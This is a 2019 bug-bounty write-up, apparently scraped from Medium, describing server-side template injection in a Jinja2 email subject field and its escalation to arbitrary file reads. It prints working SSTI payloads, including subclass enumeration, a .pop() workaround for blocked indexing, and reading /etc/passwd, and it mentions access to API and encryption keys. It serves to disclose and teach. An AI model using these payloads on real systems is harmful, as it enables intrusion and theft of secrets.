---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-09-17_rce-with-flask-jinja-template-injection.md
original_filename: 2019-09-17_rce-with-flask-jinja-template-injection.md
title: RCE with Flask Jinja Template Injection
category: documents
detected_topics:
- command-injection
- cloud-security
tags:
- imported
- documents
- command-injection
- cloud-security
language: en
raw_sha256: 96704cdd92e2f573d62d306b178d03c38fbdb44f21590806edc1fb3ca9762ce5
text_sha256: 5aad6435c6862eedb8666563f10041e56d744023e7461119a607cc435f5898a3
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# RCE with Flask Jinja Template Injection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-09-17_rce-with-flask-jinja-template-injection.md
- Source Type: markdown
- Detected Topics: command-injection, cloud-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `96704cdd92e2f573d62d306b178d03c38fbdb44f21590806edc1fb3ca9762ce5`
- Text SHA256: `5aad6435c6862eedb8666563f10041e56d744023e7461119a607cc435f5898a3`


## Content

---
title: "RCE with Flask Jinja Template Injection"
url: "https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870"
authors: ["AkShAy KaTkAr (@AkShAy KaTkAr)"]
bugs: ["SSTI", "RCE"]
publication_date: "2019-09-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5023
scraped_via: "browseros"
---

# RCE with Flask Jinja Template Injection

Top highlight

RCE with Flask Jinja Template Injection
AkShAy KaTkAr
Follow
4 min read
·
Sep 17, 2019

834

2

I got invite for private program on bugcrowd. Program do not have huge scope , just a single app with lots of features to test. I usually likes this kind of programs as I am not that good with recon .

First thought , Lets Find out what technology a website is built with. I use wappalyzer for that. They were using Angular dart , python Django & flask .

+.Being a Python developer for last few years , I know where commonly developer makes mistakes .

There were one utility named work flow builder . which use to build a financial close process flow. You can automate daily activities with it like sending approval & sending reminder emails. Sending emails functionality caught my attention because most of times this email generator apps are vulnerable to template injection. As this website built with python , i was quite sure that they must be using Jinja2 template.

Send email function have 3 fields . To , title & description . I set {{7*7}} as title & description & click on send email button . I got email as “49” as subject & {{7*7}} as description . So the subject field was vulnerable for template injection.

Payload : {{7*7}}

Press enter or click to view image in full size
Payload {{7*7}}

basically what this doing is evaluating python code inside curly brackets . I tried another payload to get list of sub classes of object class.

Payload : {{ [].__class__.__base__.__subclasses__() }}

I got email containing list of sub classes of object class. like below

Press enter or click to view image in full size
Payload : {{ [].__class__.__base__.__subclasses__() }}

Let me explain you this payload ,

If you are familiar with python , You may know we can create list by using “[]” . You can try this things in python interpreter .

Access class of list
>>> [].__class__
<type 'list'>  #return class of list

2. Access base class of list .

>>> [].__class__.__base__
<type 'object'> #return base class of list

List is sub class of “object” class.

3.Access sub classes of object class .

>>> [].__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>.....

So our payload gives us a list of all sub classes “object” class.

I reported this issue as it is , hoping I don’t have to go further to prove it’s significant impact. bugcrowd triager reply me with this

Press enter or click to view image in full size

Ok , so now I have to provide POC to prove impact of this issue to mark it as P1.

Get AkShAy KaTkAr’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Most of django apps have config file which contains really sensitive info like AWS keys , API’s & encryption keys. I have path of that config file from my previous findings. So i decided to read that file .

To read file in python you have to create object of “file”. We already have list of all sub classes of “Object class”.

Lets find index of file class

>>> [].__class__.__base__.__subclasses__().index(file)
40  #return index of "file" object

When you run “[].__class__.__base__.__subclasses__().index(file)” this payload in python interpreter you will get index of “file” object.

I tried same payload but it gives me nothing , something is wrong . I tried to access other objects but its giving similar error , not returning any value.

Press enter or click to view image in full size

Next , I decided to directly access file object as we know index of file object in “Object ” sub classes list is “40".

So I tried this payload {{[].__class__.__base__.__subclasses__()[40] }}

but got no success, this payload also returning similar result as above image. Payload is breaking somewhere , but not able to find where.

After some research , I got on conclusion that may be indexing is block or breaking my payload.

If you know little bit of python you may know there are multiple methods to return value in list , one of method is using “pop” function .

>>> [1,2,3,4,5].pop(2)
3

Above code returning third value of list & removing it from that list. So now my new payload is

{{[].__class__.__base__.__subclasses__().pop(40) }}

Above payload gives me object of “file” .

Press enter or click to view image in full size

Ok, So now I have object of “file” , I can read any file on server . Let’s read “etc/passwd” file .

Payload : {{[].__class__.__base__.__subclasses__().pop(40)('etc/passwd').read() }}.

Press enter or click to view image in full size
etc/passwd output in email subject

Finally , I was able to read files on server. I also able to read local files on the GCE instance responsible for sending notifications, including some source code, and configuration files containing very sensitive values (e.g. API and encryption keys).

Thanks for reading, If you like this article please share. You are free to ask any questions , Just DM me on akshukatkar .

— — Morningstar
